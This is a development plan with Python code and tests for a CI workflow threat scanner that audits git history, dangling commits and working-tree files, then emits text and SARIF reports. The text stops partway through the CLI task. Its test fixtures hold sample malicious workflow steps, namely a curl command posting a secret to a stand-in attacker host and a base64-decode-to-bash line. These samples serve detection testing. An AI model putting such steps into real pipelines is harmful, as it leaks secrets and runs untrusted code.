# Workflow-Threat Engine — Plan 3: Integration Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax. **Depends on Plans 1 & 2 being complete.**

**Goal:** Wire the rules into a shippable `credence workflow-audit` command: discover working-tree files, walk git history (incl. dangling commits) for the same threats, attach identity context, dedup to the earliest introducing commit, flag `WF-HIST-001` (deletion ≠ erasure), and render text/JSON/SARIF with `--fail-on` gating + `full-audit` integration.

**Architecture:** `history.py` walks `git log --all` over CI paths (plus a reflog/`fsck` sweep under `--include-unreachable`), reconstructs each historical blob, runs the Plan 2 rules over it, and attaches commit/author/identity metadata. `scan.py` orchestrates working-tree + history passes into `List[Dict]` findings (with stable fingerprints). `report.py`/`sarif.py` render them; `cli.py` adds the subcommand and reuses `cli_gating`.

**Tech Stack:** Python 3.9+ stdlib + `git` subprocess (mirrors `credence/git_history/scanner.py`). Zero network egress.

**Spec:** `docs/superpowers/specs/2026-06-04-workflow-threat-engine-design.md` (§3 data flow, §7 CLI, §8 output, §10 testing). **Red-team:** F-006 (dangling commits), identity-as-context.

---

## Task 1: `history.py` — path-filtered history walk runs rules over historical blobs

**Files:**
- Create: `credence/workflow_audit/history.py`
- Test: `tests/test_workflow_history.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_history.py
import subprocess
from pathlib import Path

import pytest

from credence.workflow_audit.history import scan_history


def _git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True,
                   capture_output=True, text=True)


@pytest.fixture
def repo(tmp_path):
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "config", "user.email", "dev@example.com")
    _git(tmp_path, "config", "user.name", "Dev")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    return tmp_path


def _write_commit(repo, relpath, content, *, name="Dev", email="dev@example.com"):
    p = repo / relpath
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    _git(repo, "add", relpath)
    _git(repo, "-c", f"user.name={name}", "-c", f"user.email={email}",
         "commit", "-q", "-m", f"add {relpath}")


MALICIOUS = (
    "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.PROD }}\n"
    "    steps:\n      - run: curl -d \"$T\" https://evil.example\n"
)


def test_history_scan_finds_threat_in_past_commit(repo):
    _write_commit(repo, ".github/workflows/staging.yml", MALICIOUS)
    findings = scan_history(repo)
    assert any(f.rule_id == "WF-EXFIL-001" and f.source == "history"
               for f in findings)
    f = [x for x in findings if x.rule_id == "WF-EXFIL-001"][0]
    assert f.commit and f.author == "Dev" and f.commit_date


def test_history_scan_clean_repo_returns_empty(repo):
    _write_commit(repo, ".github/workflows/ci.yml",
                  "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: echo hi\n")
    assert scan_history(repo) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_history.py -k finds_threat -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/history.py
"""Git-history forensics: walk all CI-config blobs across history, run the
rules over each, attribute commit/author/identity. Mirrors the subprocess
approach of credence/git_history/scanner.py. Zero network."""

from __future__ import annotations

import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional

from .models import Workflow, WorkflowFinding
from .parser import parse_action, parse_workflow
from .taint import resolve_job
from .rules import RuleContext, run_rules

_WF_PREFIX = ".github/workflows/"
_ACTION_SUFFIX = ("/action.yml", "/action.yaml")
_SEP = "\x01"
_FS = "\x00"
_PRETTY = f"{_SEP}%H{_FS}%an{_FS}%ae{_FS}%cn{_FS}%ce{_FS}%aI"


@dataclass
class _Commit:
    sha: str
    author: str
    author_email: str
    committer: str
    committer_email: str
    date: str


def _is_ci_path(path: str) -> bool:
    return (path.startswith(_WF_PREFIX) and path.endswith((".yml", ".yaml"))) \
        or path.endswith(_ACTION_SUFFIX)


def _blob(repo: Path, sha: str, path: str) -> Optional[str]:
    try:
        out = subprocess.run(["git", "-C", str(repo), "show", f"{sha}:{path}"],
                             capture_output=True, text=True, errors="replace")
    except FileNotFoundError:
        raise ValueError("git executable not found on PATH")
    return out.stdout if out.returncode == 0 else None


def _parse(path: str, text: str) -> Workflow:
    if path.endswith(_ACTION_SUFFIX):
        return parse_action(text, path=path)
    return parse_workflow(text, path=path)


def _run_over_blob(wf: Workflow, ctx: RuleContext) -> List[WorkflowFinding]:
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return run_rules(wf, resolved, ctx)


def _iter_commit_files(repo: Path, since, max_commits):
    args = ["git", "-C", str(repo), "log", "--all", "--reverse", "--no-color",
            "--name-status", f"--pretty=format:{_PRETTY}"]
    if since:
        args += ["--since", since]
    if max_commits:
        args += [f"--max-count={int(max_commits)}"]
    proc = subprocess.run(args, capture_output=True, text=True, errors="replace")
    commit: Optional[_Commit] = None
    for line in proc.stdout.splitlines():
        if line.startswith(_SEP):
            sha, an, ae, cn, ce, date = line[1:].split(_FS)
            commit = _Commit(sha, an, ae, cn, ce, date)
        elif line and commit and line[0] in ("A", "M"):
            parts = line.split("\t")
            if len(parts) >= 2 and _is_ci_path(parts[-1]):
                yield commit, parts[-1]


def scan_history(repo_path, *, since: Optional[str] = None,
                 max_commits: Optional[int] = None,
                 working_tree_paths: Optional[set] = None,
                 extra_hosts: Optional[set] = None) -> List[WorkflowFinding]:
    repo = Path(repo_path)
    findings: List[WorkflowFinding] = []
    for commit, path in _iter_commit_files(repo, since, max_commits):
        text = _blob(repo, commit.sha, path)
        if text is None:
            continue
        wf = _parse(path, text)
        ctx = RuleContext(source="history", extra_hosts=extra_hosts or set())
        for f in _run_over_blob(wf, ctx):
            f.source = "history"
            f.commit = commit.sha
            f.commit_short = commit.sha[:7]
            f.author = commit.author
            f.committer = commit.committer
            f.commit_date = commit.date
            findings.append(f)
    return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_history.py -k "finds_threat or clean_repo" -v`
Expected: PASS (2 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/history.py tests/test_workflow_history.py
git commit -m "feat(workflow-audit): git-history pass runs rules over historical blobs"
```

---

## Task 2: Identity-as-context flags (never a standalone verdict)

**Files:**
- Modify: `credence/workflow_audit/history.py`
- Test: `tests/test_workflow_history.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_history.py  (append)
def test_identity_flags_author_committer_mismatch_and_first_timer(repo):
    # an existing contributor establishes history first
    _write_commit(repo, "README.md", "hi", name="Dev", email="dev@example.com")
    # a brand-new author commits a malicious workflow (author != committer via -c)
    p = repo / ".github/workflows/staging.yml"
    p.write_text(MALICIOUS)
    _git(repo, "add", ".github/workflows/staging.yml")
    subprocess.run(
        ["git", "-C", str(repo),
         "-c", "user.name=Committer", "-c", "user.email=committer@ci.example",
         "commit", "-q",
         "--author=ci-bot <ci-bot@noreply.example>", "-m", "build optimization"],
        check=True, capture_output=True, text=True)

    findings = scan_history(repo)
    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"][0]
    assert "author_committer_mismatch" in exfil.identity_flags
    assert "first_time_contributor_touching_workflows" in exfil.identity_flags
    # identity never changes severity (still HIGH from content)
    assert exfil.severity.value == "HIGH"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_history.py -k identity_flags -v`
Expected: FAIL — `identity_flags` empty

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/history.py  (add helper + use in scan_history)
_BOTISH = ("bot", "ci-bot", "[bot]", "github-actions")


def _author_first_commits(repo: Path) -> Dict[str, str]:
    """Map author-email -> sha of their earliest commit across all history."""
    args = ["git", "-C", str(repo), "log", "--all", "--reverse", "--no-color",
            f"--pretty=format:%H{_FS}%ae"]
    proc = subprocess.run(args, capture_output=True, text=True, errors="replace")
    first: Dict[str, str] = {}
    for line in proc.stdout.splitlines():
        if _FS in line:
            sha, ae = line.split(_FS, 1)
            first.setdefault(ae, sha)
    return first


def _identity_flags(commit: _Commit, first_by_email: Dict[str, str]) -> List[str]:
    flags: List[str] = []
    if commit.author_email != commit.committer_email or commit.author != commit.committer:
        flags.append("author_committer_mismatch")
    low = (commit.author + " " + commit.author_email).lower()
    if any(b in low for b in _BOTISH):
        flags.append("bot_authored_content_change")
    if first_by_email.get(commit.author_email) == commit.sha:
        flags.append("first_time_contributor_touching_workflows")
    if commit.author_email and ("noreply" in commit.author_email
                                or commit.author_email.count("@") != 1):
        flags.append("author_email_domain_anomaly")
    return flags
```

Then in `scan_history`, compute `first_by_email = _author_first_commits(repo)` once before the loop, and set `f.identity_flags = _identity_flags(commit, first_by_email)` for each finding.

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_history.py -v`
Expected: PASS (identity flags attached; severity unchanged — enrichment only)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/history.py tests/test_workflow_history.py
git commit -m "feat(workflow-audit): identity-as-context flags on history findings"
```

---

## Task 3: Dedup to earliest commit + `WF-HIST-001` (persists_in_history_only)

**Files:**
- Modify: `credence/workflow_audit/history.py`
- Test: `tests/test_workflow_history.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_history.py  (append)
def test_dedup_keeps_earliest_commit(repo):
    _write_commit(repo, ".github/workflows/s.yml", MALICIOUS)      # introduce
    (repo / ".github/workflows/s.yml").write_text(MALICIOUS + "# trivially edited\n")
    _git(repo, "add", ".github/workflows/s.yml")
    _git(repo, "commit", "-q", "-m", "tweak")                      # re-touch
    findings = scan_history(repo, dedup=True)
    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"]
    assert len(exfil) == 1   # earliest only


def test_persists_in_history_only_when_file_gone_from_working_tree(repo):
    _write_commit(repo, ".github/workflows/s.yml", MALICIOUS)
    _git(repo, "rm", "-q", ".github/workflows/s.yml")
    _git(repo, "commit", "-q", "-m", "delete workflow")
    findings = scan_history(repo, working_tree_paths=set(), dedup=True)
    hist = [f for f in findings if f.rule_id == "WF-HIST-001"]
    assert hist and hist[0].persists_in_history_only is True
    assert hist[0].severity.value in ("HIGH", "CRITICAL")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_history.py -k "dedup or persists" -v`
Expected: FAIL — `scan_history` has no `dedup` kw / no `WF-HIST-001`

- [ ] **Step 3: Write minimal implementation**

Add a `dedup` parameter and post-processing to `scan_history`:

```python
# credence/workflow_audit/history.py  (extend scan_history signature + tail)
import copy as _copy
from .models import Severity


def _dedup_earliest(findings: List[WorkflowFinding]) -> List[WorkflowFinding]:
    seen = {}
    for f in findings:                       # findings already in --reverse (earliest-first) order
        key = (f.rule_id, f.file_path, f.job, f.snippet)
        if key not in seen:
            seen[key] = f
    return list(seen.values())


def _hist_findings(findings, working_tree_paths) -> List[WorkflowFinding]:
    out: List[WorkflowFinding] = []
    if working_tree_paths is None:
        return out
    for f in findings:
        high = f.severity in (Severity.HIGH, Severity.CRITICAL)
        content = f.rule_id.startswith(("WF-EXEC", "WF-EXFIL", "WF-INJ"))
        if high and content and f.file_path not in working_tree_paths:
            h = _copy.copy(f)
            h.rule_id = "WF-HIST-001"
            h.title = "Malicious pipeline persists in history after deletion"
            h.persists_in_history_only = True
            h.message = (f"{f.rule_id} fired on commit {f.commit_short} for a file "
                         f"no longer in the working tree (deletion != erasure)")
            h.cicd_sec = ["CICD-SEC-4"]
            out.append(h)
    return out
```

Update the end of `scan_history` to accept `dedup=False` and apply:

```python
    if dedup:
        findings = _dedup_earliest(findings)
    findings += _hist_findings(findings, working_tree_paths)
    return findings
```

(Adjust the `def scan_history(...)` signature to add `dedup: bool = False`.)

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_history.py -v`
Expected: PASS (dedup keeps earliest; `WF-HIST-001` fires for deleted-but-historical malicious workflow)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/history.py tests/test_workflow_history.py
git commit -m "feat(workflow-audit): WF-HIST-001 deletion-not-erasure + earliest-commit dedup"
```

---

## Task 4: Dangling / unreachable-commit sweep (F-006, `--include-unreachable`)

**Files:**
- Modify: `credence/workflow_audit/history.py`
- Test: `tests/test_workflow_history.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_history.py  (append)
def test_unreachable_commit_on_deleted_branch_found_only_with_flag(repo):
    _write_commit(repo, "README.md", "base")
    # malicious workflow on a feature branch, then delete the branch -> unreachable
    _git(repo, "checkout", "-q", "-b", "feature")
    _write_commit(repo, ".github/workflows/evil.yml", MALICIOUS)
    _git(repo, "checkout", "-q", "master") if _has_master(repo) else _git(repo, "checkout", "-q", "main")
    _git(repo, "branch", "-q", "-D", "feature")

    assert scan_history(repo) == [] or all(
        f.rule_id != "WF-EXFIL-001" for f in scan_history(repo))
    found = scan_history(repo, include_unreachable=True)
    assert any(f.rule_id == "WF-EXFIL-001" for f in found)


def _has_master(repo):
    out = subprocess.run(["git", "-C", str(repo), "branch", "--format=%(refname:short)"],
                         capture_output=True, text=True)
    return "master" in out.stdout.split()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_history.py -k unreachable -v`
Expected: FAIL — `include_unreachable` not supported

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/history.py  (add dangling sweep)
def _dangling_commits(repo: Path) -> List[str]:
    shas: List[str] = []
    out = subprocess.run(
        ["git", "-C", str(repo), "fsck", "--no-reflogs", "--lost-found"],
        capture_output=True, text=True, errors="replace")
    for line in (out.stdout + out.stderr).splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[1] == "commit":
            shas.append(parts[2])
    # also reflog entries
    rl = subprocess.run(["git", "-C", str(repo), "reflog", "--all",
                         "--format=%H"], capture_output=True, text=True)
    shas.extend(s for s in rl.stdout.split() if s)
    return list(dict.fromkeys(shas))


def _commit_meta(repo: Path, sha: str) -> Optional[_Commit]:
    out = subprocess.run(["git", "-C", str(repo), "show", "-s",
                          f"--pretty=format:{_PRETTY[1:]}", sha],
                         capture_output=True, text=True, errors="replace")
    if out.returncode != 0 or _FS not in out.stdout:
        return None
    an, ae, cn, ce, date = out.stdout.split(_FS)
    return _Commit(sha, an, ae, cn, ce, date)


def _ci_paths_at(repo: Path, sha: str) -> List[str]:
    out = subprocess.run(["git", "-C", str(repo), "ls-tree", "-r", "--name-only", sha],
                         capture_output=True, text=True, errors="replace")
    return [p for p in out.stdout.splitlines() if _is_ci_path(p)]
```

Then, inside `scan_history`, after the reachable walk, when `include_unreachable` is set, scan dangling commits not already seen:

```python
    if include_unreachable:
        seen_shas = {f.commit for f in findings if f.commit}
        for sha in _dangling_commits(repo):
            if sha in seen_shas:
                continue
            commit = _commit_meta(repo, sha)
            if not commit:
                continue
            for path in _ci_paths_at(repo, sha):
                text = _blob(repo, sha, path)
                if text is None:
                    continue
                wf = _parse(path, text)
                ctx = RuleContext(source="history", extra_hosts=extra_hosts or set())
                for f in _run_over_blob(wf, ctx):
                    f.source = "history"
                    f.commit, f.commit_short = sha, sha[:7]
                    f.author, f.committer, f.commit_date = (
                        commit.author, commit.committer, commit.date)
                    f.identity_flags = _identity_flags(commit, first_by_email)
                    findings.append(f)
```

(Add `include_unreachable: bool = False` to the signature; place this block **before** the `dedup`/`_hist_findings` tail.)

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_history.py -v`
Expected: PASS (unreachable commit found only with `include_unreachable=True`)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/history.py tests/test_workflow_history.py
git commit -m "feat(workflow-audit): dangling/unreachable-commit sweep (F-006)"
```

---

## Task 5: `scan.py` orchestrator — discovery + working-tree + history → List[Dict]

**Files:**
- Create: `credence/workflow_audit/scan.py`
- Test: `tests/test_workflow_scan.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_scan.py
from pathlib import Path
from credence.workflow_audit.scan import scan


def _mk(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)


def test_scan_working_tree_returns_dict_findings(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
        "    steps:\n      - run: curl -d \"$T\" https://evil.example\n")
    findings = scan(tmp_path, history=False)
    assert isinstance(findings, list) and isinstance(findings[0], dict)
    assert findings[0]["severity"] in ("HIGH", "CRITICAL")
    assert findings[0]["fingerprint"]            # populated


def test_scan_unparseable_workflow_emits_fail_loud_finding(tmp_path):
    _mk(tmp_path, ".github/workflows/bad.yml", "on: [push\n  : : :\n")
    findings = scan(tmp_path, history=False)
    assert any(f["rule_id"] == "WF-PARSE-001" and f["severity"] == "HIGH"
               for f in findings)


def test_scan_fingerprints_are_stable_and_unique(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
        "      - run: echo x | base64 -d | bash\n")
    a = scan(tmp_path, history=False)
    b = scan(tmp_path, history=False)
    assert [f["fingerprint"] for f in a] == [f["fingerprint"] for f in b]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_scan.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/scan.py
"""Orchestrator: discover CI files, run rules on the working tree and (optionally)
git history, merge to List[Dict] findings with stable fingerprints. Fail-loud on
unparseable-but-real workflow files (F-009)."""

from __future__ import annotations

import fnmatch
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Set

from .allowlist import parse_suppressions
from .models import Confidence, Platform, Severity, WorkflowFinding
from .parser import parse_action, parse_workflow
from .platforms import ACTION_GLOBS, WORKFLOW_GLOBS
from .taint import resolve_job
from .rules import RuleContext, run_rules
from .history import scan_history


def _fingerprint(f: WorkflowFinding) -> str:
    basis = f"{f.rule_id}|{f.file_path}|{f.job}|{f.source}|{f.commit or ''}|{f.snippet}"
    return hashlib.sha256(basis.encode("utf-8", "replace")).hexdigest()[:16]


def _discover(root: Path) -> List[Path]:
    out: List[Path] = []
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        rel = p.relative_to(root).as_posix()
        if any(fnmatch.fnmatch(rel, g) for g in WORKFLOW_GLOBS) or \
           any(fnmatch.fnmatch(rel, g) for g in ACTION_GLOBS):
            out.append(p)
    return out


def _scan_file(path: Path, root: Path, extra_hosts: Set[str]) -> List[WorkflowFinding]:
    rel = path.relative_to(root).as_posix()
    text = path.read_text(errors="replace")
    is_action = rel.endswith(("action.yml", "action.yaml"))
    wf = parse_action(text, path=rel) if is_action else parse_workflow(text, path=rel)
    if not wf.parse_ok:
        return [WorkflowFinding(
            rule_id="WF-PARSE-001",
            title="Unparseable workflow GitHub may still execute",
            severity=Severity.HIGH, confidence=Confidence.MEDIUM,
            platform=Platform.GITHUB_ACTIONS, file_path=rel,
            message="File did not parse as YAML; rule coverage degraded (fail-loud, F-009)",
            line=1, cicd_sec=["CICD-SEC-7"],
            remediation="Validate the workflow YAML; malformed files can still run.")]
    ctx = RuleContext(suppressions=parse_suppressions(text), extra_hosts=extra_hosts)
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return run_rules(wf, resolved, ctx)


def scan(path, *, history: bool = True, include_unreachable: bool = False,
         since: Optional[str] = None, max_commits: Optional[int] = None,
         extra_hosts: Optional[Set[str]] = None) -> List[Dict]:
    root = Path(path)
    extra_hosts = extra_hosts or set()
    findings: List[WorkflowFinding] = []
    wt_paths: Set[str] = set()
    for f in _discover(root):
        rel = f.relative_to(root).as_posix()
        wt_paths.add(rel)
        findings.extend(_scan_file(f, root, extra_hosts))
    for f in findings:
        f.source = "working_tree"
    if history and (root / ".git").exists():
        findings.extend(scan_history(
            root, since=since, max_commits=max_commits,
            include_unreachable=include_unreachable,
            working_tree_paths=wt_paths, extra_hosts=extra_hosts, dedup=True))
    for f in findings:
        f.fingerprint = _fingerprint(f)
    return [f.to_dict() for f in findings]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_scan.py -v`
Expected: PASS (3 tests, incl. fail-loud `WF-PARSE-001` and stable fingerprints)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/scan.py tests/test_workflow_scan.py
git commit -m "feat(workflow-audit): scan orchestrator (working-tree + history) with fail-loud parse"
```

---

## Task 6: `report.py` — human-readable report (grouped, suppressed section)

**Files:**
- Create: `credence/workflow_audit/report.py`
- Test: `tests/test_workflow_report.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_report.py
from credence.workflow_audit.report import render_report


FINDINGS = [
    {"rule_id": "WF-EXFIL-001", "title": "Secret to sink", "severity": "HIGH",
     "confidence": "HIGH", "file_path": ".github/workflows/s.yml", "job": "b",
     "step_index": 0, "line": 7, "message": "secret to evil.example",
     "frameworks": {"cicd_sec": ["CICD-SEC-4"], "mitre": ["T1567"]},
     "source": "history", "commit_short": "abc1234", "author": "ci-bot",
     "identity_flags": ["author_committer_mismatch"], "suppressed": False,
     "persists_in_history_only": True, "remediation": "rotate"},
    {"rule_id": "WF-CFG-003", "title": "Unpinned", "severity": "MEDIUM",
     "confidence": "MEDIUM", "file_path": ".github/workflows/s.yml", "job": "b",
     "line": 3, "message": "unpinned action", "frameworks": {"cicd_sec": [], "mitre": []},
     "source": "working_tree", "suppressed": True, "suppression_reason": "approved",
     "identity_flags": [], "persists_in_history_only": False, "remediation": ""},
]


def test_report_groups_and_shows_history_context():
    out = render_report(FINDINGS)
    assert "WF-EXFIL-001" in out
    assert "HIGH" in out
    assert "abc1234" in out and "ci-bot" in out               # history attribution
    assert "author_committer_mismatch" in out                # identity context
    assert "deletion" in out.lower() or "history" in out.lower()


def test_report_has_suppressed_section_separate():
    out = render_report(FINDINGS)
    assert "Suppressed" in out and "approved" in out
    # suppressed finding not double-counted in active section header
    assert "1 active" in out or "Active findings: 1" in out


def test_report_empty():
    assert "No workflow threats" in render_report([])
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_report.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/report.py
"""Human-readable workflow-audit report."""

from __future__ import annotations

from typing import Dict, List

_ICON = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}
_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


def _line(f: Dict) -> str:
    fw = f.get("frameworks", {})
    tags = ", ".join(fw.get("cicd_sec", []) + fw.get("mitre", []))
    loc = f["file_path"]
    if f.get("job"):
        loc += f":{f['job']}"
    if f.get("step_index") is not None:
        loc += f"[step {f['step_index']}]"
    parts = [f"  {_ICON.get(f['severity'], '⚪')} [{f['severity']}] {f['rule_id']} "
             f"({f.get('confidence','')}) — {f['title']}",
             f"      {loc}:{f.get('line', 0)}  {tags}",
             f"      {f.get('message','')}"]
    if f.get("source") == "history":
        ident = ", ".join(f.get("identity_flags") or []) or "none"
        flag = "  [persists in history only]" if f.get("persists_in_history_only") else ""
        parts.append(f"      commit {f.get('commit_short','?')} by "
                     f"{f.get('author','?')}  identity: {ident}{flag}")
    if f.get("remediation"):
        parts.append(f"      fix: {f['remediation']}")
    return "\n".join(parts)


def render_report(findings: List[Dict]) -> str:
    if not findings:
        return "No workflow threats detected.\n"
    active = [f for f in findings if not f.get("suppressed")]
    suppressed = [f for f in findings if f.get("suppressed")]
    active.sort(key=lambda f: _ORDER.get(f["severity"], 9))
    lines = ["=" * 72, "WORKFLOW THREAT AUDIT", "=" * 72,
             f"Active findings: {len(active)}   Suppressed: {len(suppressed)}", ""]
    for f in active:
        lines.append(_line(f))
        lines.append("")
    if suppressed:
        lines += ["-" * 72, "Suppressed (visible, not gating):", ""]
        for f in suppressed:
            reason = f.get("suppression_reason") or "no reason given"
            lines.append(_line(f))
            lines.append(f"      suppressed: {reason}")
            lines.append("")
    return "\n".join(lines)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_report.py -v`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/report.py tests/test_workflow_report.py
git commit -m "feat(workflow-audit): human-readable report with suppressed section"
```

---

## Task 7: `sarif.py` — SARIF 2.1.0 emitter

**Files:**
- Create: `credence/workflow_audit/sarif.py`
- Test: `tests/test_workflow_sarif.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_sarif.py
import json
from credence.workflow_audit.sarif import to_sarif


FINDINGS = [
    {"rule_id": "WF-EXFIL-001", "title": "Secret to sink", "severity": "HIGH",
     "confidence": "HIGH", "file_path": ".github/workflows/s.yml", "job": "b",
     "step_index": 0, "line": 7, "message": "secret to evil.example",
     "frameworks": {"cicd_sec": ["CICD-SEC-4"], "mitre": ["T1567"]},
     "source": "working_tree", "suppressed": False, "fingerprint": "deadbeefcafe0001",
     "identity_flags": [], "persists_in_history_only": False, "remediation": "rotate"},
    {"rule_id": "WF-CFG-003", "title": "Unpinned", "severity": "MEDIUM",
     "confidence": "MEDIUM", "file_path": ".github/workflows/s.yml", "line": 3,
     "message": "unpinned", "frameworks": {"cicd_sec": [], "mitre": []},
     "source": "working_tree", "suppressed": True, "suppression_reason": "ok",
     "fingerprint": "deadbeefcafe0002", "identity_flags": [],
     "persists_in_history_only": False, "remediation": ""},
]


def test_sarif_is_valid_shape():
    doc = json.loads(to_sarif(FINDINGS))
    assert doc["version"] == "2.1.0"
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "credence-workflow-audit"
    rule_ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
    assert {"WF-EXFIL-001", "WF-CFG-003"} <= rule_ids


def test_sarif_results_carry_fingerprints_tags_and_suppressions():
    run = json.loads(to_sarif(FINDINGS))["runs"][0]
    exfil = [r for r in run["results"] if r["ruleId"] == "WF-EXFIL-001"][0]
    assert exfil["partialFingerprints"]["credence/v1"] == "deadbeefcafe0001"
    assert "CICD-SEC-4" in exfil["properties"]["tags"]
    cfg = [r for r in run["results"] if r["ruleId"] == "WF-CFG-003"][0]
    assert cfg["suppressions"][0]["kind"] == "inSource"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_sarif.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/sarif.py
"""SARIF 2.1.0 emitter for workflow-audit (mirrors agent_exposure/sarif.py)."""

from __future__ import annotations

import json
from typing import Dict, List

_LEVEL = {"CRITICAL": "error", "HIGH": "error", "MEDIUM": "warning",
          "LOW": "note", "INFO": "note"}


def _rule_descriptors(findings: List[Dict]) -> List[Dict]:
    by_id: Dict[str, Dict] = {}
    for f in findings:
        by_id.setdefault(f["rule_id"], {
            "id": f["rule_id"],
            "name": f.get("title", f["rule_id"]),
            "shortDescription": {"text": f.get("title", f["rule_id"])},
            "properties": {"tags": (f.get("frameworks", {}).get("cicd_sec", [])
                                    + f.get("frameworks", {}).get("mitre", []))},
        })
    return list(by_id.values())


def _result(f: Dict) -> Dict:
    fw = f.get("frameworks", {})
    res = {
        "ruleId": f["rule_id"],
        "level": _LEVEL.get(f["severity"], "warning"),
        "message": {"text": f.get("message", f.get("title", ""))},
        "partialFingerprints": {"credence/v1": f.get("fingerprint", "")},
        "properties": {
            "tags": fw.get("cicd_sec", []) + fw.get("mitre", []),
            "confidence": f.get("confidence", ""),
            "source": f.get("source", "working_tree"),
            "identity_flags": f.get("identity_flags", []),
            "persists_in_history_only": f.get("persists_in_history_only", False),
        },
        "locations": [{
            "physicalLocation": {
                "artifactLocation": {"uri": f["file_path"]},
                "region": {"startLine": max(1, int(f.get("line", 1)))},
            }
        }],
    }
    if f.get("suppressed"):
        res["suppressions"] = [{
            "kind": "inSource",
            "justification": f.get("suppression_reason") or "credence:ignore",
        }]
    return res


def to_sarif(findings: List[Dict]) -> str:
    doc = {
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {"driver": {
                "name": "credence-workflow-audit",
                "informationUri": "https://github.com/fevra-dev/Credence",
                "rules": _rule_descriptors(findings),
            }},
            "results": [_result(f) for f in findings],
        }],
    }
    return json.dumps(doc, indent=2)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_sarif.py -v`
Expected: PASS (2 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/sarif.py tests/test_workflow_sarif.py
git commit -m "feat(workflow-audit): SARIF 2.1.0 emitter with fingerprints + suppressions"
```

---

## Task 8: CLI — `workflow-audit` subcommand + flags + `--fail-on` gating

**Files:**
- Modify: `credence/cli.py`
- Test: `tests/test_workflow_audit_cli.py`

- [ ] **Step 1: Read the existing pattern first**

Run: `grep -n "agent-audit\|add_parser\|set_defaults\|add_fail_on_arg\|exit_code_for" credence/cli.py`
Use the `agent-audit` subcommand block as the template for argument registration, output dispatch, and gating. Match its structure exactly (subparser creation, handler naming, `-o/--format` handling).

- [ ] **Step 2: Write the failing test**

```python
# tests/test_workflow_audit_cli.py
import json
import subprocess
import sys
from pathlib import Path


def _mk(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)


MAL = ("on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
       "    steps:\n      - run: curl -d \"$T\" https://evil.example\n")


def _run(args, cwd):
    return subprocess.run([sys.executable, "-m", "credence.cli", *args],
